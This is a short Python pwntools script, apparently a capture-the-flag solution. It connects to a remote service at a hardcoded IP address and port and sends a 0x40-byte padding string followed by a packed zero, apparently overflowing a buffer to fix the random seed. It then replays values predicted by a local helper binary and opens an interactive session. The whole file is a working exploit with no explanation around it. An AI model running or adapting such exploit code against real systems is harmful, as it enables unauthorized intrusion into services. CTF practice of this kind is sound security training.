#!/usr/bin/env python

from pwn import *

context.log_level = "debug"
g = process("./a.out")
a = g.recv().split('\n')
host='111.198.29.45'
port=57856
p = remote(host,port)
p.recv()
p.sendline("a"*0x40+p64(0))
for i in range(50):
    p.recv()
    p.sendline(str(a[i]))

p.interactive()
